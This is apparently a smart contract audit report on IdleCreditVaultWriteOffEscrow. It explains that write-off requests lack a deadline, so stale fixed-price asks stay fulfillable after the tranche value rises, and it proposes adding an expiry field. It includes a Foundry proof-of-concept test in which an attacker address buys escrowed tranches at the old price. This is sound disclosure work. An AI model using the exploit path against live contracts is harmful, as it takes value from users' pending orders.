### Title
Stale write-off requests can be fulfilled after tranche value changes - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](https://github.com/Noahgrantyt/idle-tranches--022/blob/main/contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` records a fixed tranche amount and fixed requested underlying amount, but stores no deadline or expiration timestamp. Once created during a running epoch, the request remains executable indefinitely by any fulfiller, including after the epoch stops and tranche value changes.

### Finding Description
The `WriteOffRequest` struct only stores `tranches` and `underlyings`; it has no creation timestamp or expiry field. [1](#0-0) 

A requester deposits tranche tokens and fixes its ask price through `underlyingsRequested`. [2](#0-1) 

Any caller can subsequently execute that request as long as the recorded tranche amount matches and the supplied underlying amount is at least the stored ask. [3](#0-2) 

There is no check that fulfillment occurs before a deadline, within the same epoch, or before the pool reprices. Deletion is therefore the requester's only cancellation mechanism. [4](#0-3) 

### Impact Explanation
A stale ask can remain valid after market conditions or the CDO's tranche price improve. An unprivileged fulfiller can then purchase the escrowed tranche tokens at the old fixed price and receive assets worth more than the underlying paid.

For example, a requester may escrow `10,000` tranche tokens for `10,000` underlying while the tranche price is approximately `1.0`. If yield accrual raises the price to `1.2`, a fulfiller can still pay `10,000` underlying and receive tranche tokens worth approximately `12,000` underlying, extracting about `2,000` underlying of value before fees.

The seller retains the ability to delete the request, but does not have an automatic expiration or last-second protection. A delayed or missed cancellation leaves the stale order executable.

### Likelihood Explanation
The condition requires the requester to leave a request outstanding while the tranche value appreciates or market pricing changes. Requests are intentionally intended to remain pending until deleted or fulfilled, so no privileged action or compromised role is required for execution. Fulfillment is permissionless by design.

The issue is more likely when requests remain open across epoch transitions because tranche pricing and expected redemption value are epoch-dependent. [5](#0-4) 

### Recommendation
Add an expiration deadline to `WriteOffRequest`, chosen by the requester when creating or extending the request:

```solidity
struct WriteOffRequest {
    uint256 tranches;
    uint256 underlyings;
    uint256 deadline;
}
```

`createWriteOffRequest` should either accept a caller-specified deadline or apply a bounded maximum TTL. `fullfillWriteOffRequest` should revert once `block.timestamp > deadline`, while `deleteWriteOffRequest` should remain callable regardless of expiry. A `deadline == 0` value could be supported only if an indefinite request is intended to remain valid.

### Proof of Concept
The following Foundry test can be added to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`. It demonstrates that a request created in one epoch remains executable after epoch completion and repricing, despite the requester never refreshing its ask.

```solidity
function testStaleWriteOffRequestRemainsFulfillableAfterEpoch() external {
    uint256 requestedTranches = 10_000e18;
    uint256 requestedUnderlyings = 10_000e6;
    address attacker = makeAddr("attacker");

    uint256 priceBefore = cdoEpoch.virtualPrice(address(tranche));

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, requestedUnderlyings);

    // Complete the epoch and accrue 1,000 USDC using the existing helper.
    _stopCurrentEpoch();

    uint256 priceAfter = cdoEpoch.virtualPrice(address(tranche));
    assertGt(priceAfter, priceBefore, "tranche value did not change");

    deal(address(underlying), attacker, requestedUnderlyings);

    uint256 sellerUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerTranchesBefore = tranche.balanceOf(attacker);

    vm.startPrank(attacker);
    underlying.approve(address(escrow), requestedUnderlyings);
    escrow.fullfillWriteOffRequest(
        LP,
        requestedTranches,
        requestedUnderlyings
    );
    vm.stopPrank();

    uint256 fee = requestedUnderlyings * escrow.exitFee() / escrow.FULL_VALUE();
    uint256 staleQuoteValue = requestedTranches * priceAfter / 1e18;

    assertEq(
        tranche.balanceOf(attacker) - attackerTranchesBefore,
        requestedTranches,
        "attacker did not receive escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(LP) - sellerUnderlyingBefore,
        requestedUnderlyings - fee,
        "seller received wrong stale ask"
    );
    assertGt(
        staleQuoteValue,
        requestedUnderlyings,
        "fulfillment was not economically stale"
    );
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
```

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
